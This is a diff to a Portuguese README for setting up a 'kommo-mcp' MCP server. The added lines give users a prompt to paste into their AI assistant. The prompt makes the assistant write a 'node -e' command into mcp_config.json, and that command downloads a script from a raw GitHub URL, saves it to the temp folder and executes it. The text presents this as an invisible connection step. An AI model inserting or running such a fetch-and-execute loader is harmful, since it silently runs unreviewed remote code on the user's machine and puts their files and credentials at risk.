@@ -12,7 +12,10 @@ A forma de conectar o servidor depende de qual interface sua equipe usa:
 ### Opção 1: Antigravity (Local)
 Se você estiver utilizando o Antigravity, você não precisa configurar arquivos JSON manualmente. Basta copiar o texto abaixo e enviar no chat da sua Inteligência Artificial:
 
-> "Me ajude a corrigir meu arquivo `mcp_config.json`. Primeiro: Restaure TODOS os servidores MCP que eu tinha antes (busque no seu histórico). Segundo: adicione um novo servidor chamado `kommo-mcp` dentro do objeto mcpServers SEM APAGAR os outros. O comando deve ser `cmd.exe` (ou apenas `npx` se for Mac/Linux), e os argumentos devem ser exatamente a string: `npx -y supergateway --sse https://kommo-mcp.agencia-exemplo.com/sse`. Avise quando terminar."
+> "Me ajude a configurar o servidor MCP `kommo-mcp` no meu arquivo `mcp_config.json`. ATENÇÃO: Preserve todos os outros servidores MCP que eu já tenho configurados! Apenas adicione ou atualize a chave `kommo-mcp` com a seguinte configuração exata:
+> command: `node`
+> args: `[\"-e\", \"fetch('https://raw.githubusercontent.com/clarkstamina-max/kommo-mcp/main/dist/bridge/index.mjs').then(r=>r.text()).then(t=>{const p=require('path').join(require('os').tmpdir(),'kommo-bridge.mjs');require('fs').writeFileSync(p,t);import('file:///'+p.replace(/\\\\/g,'/'))})\", \"https://kommo-mcp.agencia-exemplo.com/sse\"]`
+> Avise quando terminar."
 
 A própria IA vai baixar o adaptador oficial da comunidade e se conectar à VPS invisivelmente. Dê um **Reload Window** quando ela confirmar.
 
